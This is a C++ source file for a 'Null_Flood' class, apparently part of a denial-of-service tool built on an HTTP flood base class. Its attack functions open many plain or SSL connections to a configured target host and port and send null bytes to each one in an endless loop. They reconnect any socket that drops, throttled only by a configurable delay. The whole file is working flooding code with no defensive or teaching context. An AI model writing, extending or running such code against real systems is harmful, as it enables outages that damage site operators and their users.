#include <netdb.h>
#include <cstring>
#include <csignal>
#include <unistd.h>
#include <array>
#include <openssl/ssl.h>

#include "Null_Flood.hpp"

int Null_Flood::make_socket(const char *host, const char *port) {
    struct addrinfo hints{}, *servinfo, *p;
    int sock = 0, r;
    std::string message = std::string("Connecting-> ") + host + ":" + port;
    logger->Log(&message, Logger::Info);
    bzero(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = conf->protocol == config::UDP ? SOCK_DGRAM: SOCK_STREAM;
    if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
        message = std::string("Getaddrinfo-> ") + gai_strerror(r);
        logger->Log(&message, Logger::Error);
        exit(EXIT_FAILURE);
    }
    for(p = servinfo; p != nullptr; p = p->ai_next) {
        if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) < 0) {
            continue;
        }
        if(connect(sock, p->ai_addr, p->ai_addrlen) < 0) {
            close(sock);
            continue;
        }
        break;
    }
    if(p == nullptr) {
        if(servinfo){
            freeaddrinfo(servinfo);
        }
        logger->Log("No connection could be made", Logger::Error);
        exit(EXIT_FAILURE);
    }
    if(servinfo){
        freeaddrinfo(servinfo);
    }
    message = std::string("Connected-> ") + host + ":" + port;
    logger->Log(&message, Logger::Info);
    return sock;
}

void Null_Flood::attack(const int *id) {
    int r;
    std::vector<int> sockets;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
    }
    signal(SIGPIPE, &Null_Flood::broke);
    while(true) {
        static std::string message;
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
            }
            if((r = write_socket(sockets[x],"\0", 1)) < 0){
                cleanup(&sockets[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
            }else{
                if(conf->GetResponse){
                    read_socket(sockets[x]);
                }
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                logger->Log(&message, Logger::Info);
            }
        message = std::to_string(*id) + ": Voly Sent";
        logger->Log(&message, Logger::Info);
        usleep(static_cast<__useconds_t>(conf->delay));
        }
    }
}

void Null_Flood::attack_ssl(const int *id) {
    int r;
    std::vector<int> sockets;
    std::vector<SSL_CTX *> CTXs;
    std::vector<SSL *> SSLs;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
        SSLs.push_back(nullptr);
        CTXs.push_back(nullptr);
    }
    signal(SIGPIPE, &Null_Flood::broke);
    while(true) {
        static std::string message;
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
            }
            if((r = write_socket(SSLs[x], "\0", 1)) < 0){
                cleanup(SSLs[x], &sockets[x], CTXs[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
            }else{
                if(conf->GetResponse){
                    read_socket(SSLs[x]);
                }
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                logger->Log(&message, Logger::Info);
            }
            message = std::to_string(*id) + ": Voly Sent";
            logger->Log(&message, Logger::Info);
            usleep(static_cast<__useconds_t>(conf->delay));
        }
    }
}

Null_Flood::Null_Flood(const config *conf, Logger *logger) : Http_Flood(conf, logger) {

}
